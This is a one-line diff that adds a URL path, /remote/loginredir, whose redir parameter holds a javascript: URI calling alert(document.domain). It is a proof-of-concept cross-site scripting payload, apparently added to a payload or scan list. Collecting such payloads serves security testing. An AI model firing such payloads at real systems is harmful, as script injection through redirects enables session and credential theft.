@@ -1,0 +1,1 @@
+/remote/loginredir?redir=javascript:alert(document.domain)
